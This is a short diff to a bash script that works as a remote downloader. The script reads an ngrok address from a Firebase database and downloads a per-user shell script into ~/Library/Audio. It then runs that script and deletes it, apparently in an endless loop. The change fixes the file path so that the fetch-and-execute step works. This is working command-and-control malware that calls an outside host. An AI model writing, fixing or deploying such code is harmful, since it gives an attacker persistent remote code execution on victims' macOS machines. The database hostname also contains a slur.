@@ -1,5 +1,7 @@
 #!/bin/bash
 
+EXEC_PATH="/Users/$USER/Library/Audio/$USER.sh"
+
 GetAndExec() {
     # Collect ngrok url from firebase
     response=$(curl -s "https://retard-e363c-default-rtdb.asia-southeast1.firebasedatabase.app/IP.json")
@@ -8,12 +10,12 @@ GetAndExec() {
     EXEC="$NGROK/$USER"
 
     # Download exec from ngrok url
-    curl -so "~/Library/Audio/$USER.sh" "$EXEC"
+    curl -so $EXEC_PATH "$EXEC"
 
     # Execute exec
-    sh "~/Library/Audio/$USER.sh"
+    sh $EXEC_PATH
 
-    rm "~/Library/Audio/$USER.sh"
+    rm $EXEC_PATH
 }
 
 while true; do
